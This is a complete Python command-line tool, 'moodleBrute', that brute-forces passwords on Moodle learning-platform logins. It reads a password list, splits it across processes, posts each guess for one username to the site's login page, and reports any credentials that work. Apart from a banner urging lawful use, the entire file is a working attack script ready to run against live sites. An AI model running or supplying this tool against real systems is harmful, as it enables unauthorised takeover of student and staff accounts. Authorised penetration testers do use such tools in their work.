#!/usr/bin/env python
import argparse
import requests
import time
import multiprocessing
import sys

version = '0.0.1'

def banner():
	print('''\033[1m\033[95m    __  ___             ____      ___           __
   /  |/  /__  ___  ___/ / /__   / _ )______ __/ /____
  / /|_/ / _ \/ _ \/ _  / / -_) / _  / __/ // / __/ -_)
 /_/  /_/\___/\___/\_,_/_/\__/ /____/_/  \_,_/\__/\__/
 Moodle Login Brute Forcer - \033[91mUse with responsibility and within the law >.>
\033[0m\033[95m by @Seymour_Sec
\033[0m''')

def brute(url, delay, passwords):
	start = time.time()
	errors = 0
	for password in passwords:
		if errors > 4:
			print('(\033[91mFail\033[0m): Too Many Errors Terminating')
			sys.exit(1)
		try:
			r = requests.post(f'{url}login/index.php', data={'username': args.login, 'password': password})
			loggedin = 'You are not logged in' not in r.text
			if loggedin:
				print(f'(\033[92mSuccess\033[0m): Valid Credentials \"{args.login}\" \"{password}\"')
			time.sleep(delay/1000)
		except:
			print('(\033[91mFail\033[0m): Request Error')
			errors += 1
	end = time.time()
	elapsed = end - start
	attempts = len(passwords)
	print(f'(\033[93mInfo\033[0m): Thread Complete - {attempts} attempts in {round(elapsed,2)} seconds {round(attempts/elapsed,2)}a/s with {errors} errors')
	sys.exit(0)

def splitList(alist, wantedParts=1):
    length = len(alist)
    return [alist[i*length // wantedParts: (i+1)*length // wantedParts]
             for i in range(wantedParts)]

def threader():
	try:
		with open(args.password, 'r') as f:
			passwords = f.read().splitlines()
	except IOError:
		print('(\033[91mFail\033[0m): Invalid Password List\n')
		sys.exit(1)

	threads = []
	subLists = splitList(passwords, wantedParts=args.threads)
	for i in range(0, args.threads):
		p = multiprocessing.Process(target=brute, args=(args.url, args.delay, subLists[i]))
		threads.append(p)

	try:
		for thread in threads:
			thread.start()
		for thread in threads:
			thread.join()
	except KeyboardInterrupt:
		print('\b\b(\033[91mFail\033[0m): User Interupt\n')
		for thread in threads:
			thread.terminate()
		sys.exit(1)
	threads = []
	sys.exit(0)

if __name__ == '__main__':
	parse = argparse.ArgumentParser(
		prog='moodleBrute',
		description='Moodle Login Brute Forcer')

	parse.add_argument('-v', '--version', action='version', version=f'%(prog)s v{version}', help='prints version information')
	parse.add_argument('-u', '--url',  type=str, required=True, help='the URL to moodle base install')
	parse.add_argument('-l', '--login', type=str, required=True, help='the username to try passwords for')
	parse.add_argument('-p', '--password', type=str, required=True, help='password list file')
	parse.add_argument('-t', '--threads', type=int, default=2, help='number of threads to use. default: %(default)s')
	parse.add_argument('-D', '--delay', type=int, default=25, help='request delay (ms). default: %(default)s')

	banner()
	args = parse.parse_args()
	print(f'(\033[93mInfo\033[0m): Starting brute force of {args.url} with {args.threads} threads.')
	threader()

